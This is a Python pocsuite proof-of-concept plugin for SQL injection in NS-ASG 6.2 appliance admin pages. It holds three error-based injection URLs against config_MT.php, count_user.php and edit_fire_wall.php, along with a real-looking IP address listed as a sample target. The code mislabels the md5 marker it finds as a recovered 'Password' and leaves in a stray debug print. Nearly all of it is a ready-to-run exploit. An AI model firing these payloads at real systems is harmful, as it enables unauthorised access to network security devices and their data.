#!/usr/bin/python
# -*- coding: utf-8 -*-


from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'NS-ASG 6.2 SQLI'
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['bey0nd']
    vulType = 'SQLI'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''NS-ASG 6.2 SQLI'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'NETENTSEC'
    appVersion = 'NETENTSEC'
    appPowerLink = 'NETENTSEC'
    samples = ['https://121.28.81.124/']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        payloads= ['/admin/config_MT.php?action=delete&Mid=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
        '/admin/count_user.php?action=GO&search=%27%0band%0bextractvalue(0x1,concat(0x23,md5(1)))%23',
        '/admin/edit_fire_wall.php?action=update&FireWallId=111%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
        ]
        for pay in payloads:
            url = self.url + pay
            resp = req.get(url)
            if resp and resp.text and resp.status_code == 200:
                if "c4ca4238a0b923820dcc509a6f7584" in resp.text:
                    print 'sdfsd'
                    result['DBInfo'] = {}
                    result['DBInfo']['Password'] = "c4ca4238a0b923820dcc509a6f75849b"
                    break
            
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output


register(TestPOC)
